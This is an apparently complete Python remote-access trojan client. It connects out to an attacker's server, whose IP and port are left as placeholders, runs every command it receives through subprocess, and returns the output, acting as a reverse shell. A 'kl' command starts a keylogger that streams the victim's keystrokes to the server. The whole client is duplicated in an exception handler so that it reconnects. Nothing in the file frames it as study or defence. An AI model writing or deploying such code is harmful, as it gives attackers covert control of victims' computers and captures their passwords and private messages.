import os
import socket
import threading
import subprocess
from pynput.keyboard import Listener, Key

# change PORT, SERVER down below too

HEADER = 2048
PORT = your PORT here
FORMAT = 'utf-8'
SERVER = "your public IP here dont remove quotes"
ADDR = (SERVER, PORT)
result = ""
kloutput = []
line = ""
klenabled = False
CLIENTnum = "your CLIENTNUMBER here dont remove quotes"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

try:
    def kl():
        global klenabled
        if klenabled:
            def on_press(key):
                global kloutput
                global line
                inputs = [Key.space, Key.enter, Key.space]
                if key in inputs:
                    if line:
                        kloutput.append(line)
                        line = ""
                    kloutput.append(f"<{key.name}>")
                elif hasattr(key, "char"):
                    line += str(key.char)
                else:
                    line += "<other>"
                if len(kloutput) == 2:
                    send("<kl>" + str(kloutput))
                    kloutput = []

            with Listener(on_press=on_press) as listener:
                listener.join()


    def send(msg):
        message = msg.encode(FORMAT)
        client.send(message)


    def recieve():
        global result
        global klenabled
        while True:
            mes = (client.recv(HEADER))
            command = mes.decode(FORMAT)
            splitted_command = command.split(" ")
            if command:
                if command not in ["cd", "kl", "kl close", "cmd"]:
                    result = subprocess.getoutput(command)
                if splitted_command[0].lower() == "cd":
                    try:
                        if len(splitted_command) == 2:
                            os.chdir(splitted_command[1])
                        else:
                            os.chdir(os.getcwd())
                    except FileNotFoundError as e:
                        result = str(e)
                if command == "kl":
                    klenabled = True
                    if threading.active_count() == 1:
                        thread = threading.Thread(target=kl)
                        thread.start()
                if command == "kl close":
                    klenabled = False
                cwd = os.getcwd()
                send(cwd + "<sep>" + result)


    while True:
        send("CLIENT:" + CLIENTnum)
        mes1 = (client.recv(HEADER))
        mess = mes1.decode(FORMAT)
        if mess == "connected":
            break
    recieve()

except:

# change here too

    HEADER = 2048
    PORT = your PORT here
    FORMAT = 'utf-8'
    SERVER = "your public IP here dont remove quotes"
    ADDR = (SERVER, PORT)
    result = ""
    kloutput = []
    line = ""
    klenabled = False

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(ADDR)


    def kl():
        global klenabled
        if klenabled:
            def on_press(key):
                global kloutput
                global line
                inputs = [Key.space, Key.enter, Key.space]
                if key in inputs:
                    if line:
                        kloutput.append(line)
                        line = ""
                    kloutput.append(f"<{key.name}>")
                elif hasattr(key, "char"):
                    line += str(key.char)
                else:
                    line += "<other>"
                if len(kloutput) == 2:
                    send("<kl>" + str(kloutput))
                    kloutput = []

            with Listener(on_press=on_press) as listener:
                listener.join()


    def send(msg):
        message = msg.encode(FORMAT)
        client.send(message)


    def recieve():
        global result
        global klenabled
        while True:
            mes = (client.recv(HEADER))
            command = mes.decode(FORMAT)
            splitted_command = command.split(" ")
            if command:
                if command not in ["cd", "kl", "kl close", "cmd"]:
                    result = subprocess.getoutput(command)
                if splitted_command[0].lower() == "cd":
                    try:
                        if len(splitted_command) == 2:
                            os.chdir(splitted_command[1])
                        else:
                            os.chdir(os.getcwd())
                    except FileNotFoundError as e:
                        result = str(e)
                if command == "kl":
                    klenabled = True
                    if threading.active_count() == 1:
                        thread = threading.Thread(target=kl)
                        thread.start()
                if command == "kl close":
                    klenabled = False
                cwd = os.getcwd()
                send(cwd + "<sep>" + result)


    while True:
        send("CLIENT:" + CLIENTnum)
        mes1 = (client.recv(HEADER))
        mess = mes1.decode(FORMAT)
        if mess == "connected":
            break
    recieve()
